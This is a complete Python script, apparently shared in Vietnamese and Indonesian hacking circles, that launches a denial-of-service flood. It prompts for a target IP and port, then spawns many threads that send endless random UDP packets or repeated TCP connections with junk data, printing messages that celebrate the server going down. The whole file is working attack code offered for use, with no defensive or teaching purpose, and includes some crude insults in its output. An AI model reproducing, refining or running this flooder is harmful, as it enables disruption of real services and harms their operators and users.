#!/usr/bin/env python3
#Semoga yang curi script yatim
#Ddos by Nguyễn Công Vinh
#Join My T3Am : https://discord.gg/fRDAvXsU
import random
import socket
import threading
import os

os.system("clear")
print("DDoSaTtack by CongVinh")
print("Đăng ký với like cho mình nha")
print("Yêu các bạn ❤️ ")
ip = str(input(" DdosAttackByCongVinh | Ip sever:"))
port = int(input(" DdosAttackByCongVinh | Port Sever:"))
choice = str(input(" DdosAttackByCongVinh | Mặc định y?(y/n):"))
times = int(input(" DdosAttackByCongVinh | Packets:"))
threads = int(input(" DdosAttackByCongVinh | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | Đang Tấn Công |")
		except:
			print("[!] | Server Die!!! |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Xalbador nih bos!!!")
		except:
			s.close()
			print("[*] Down lagi kontol")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
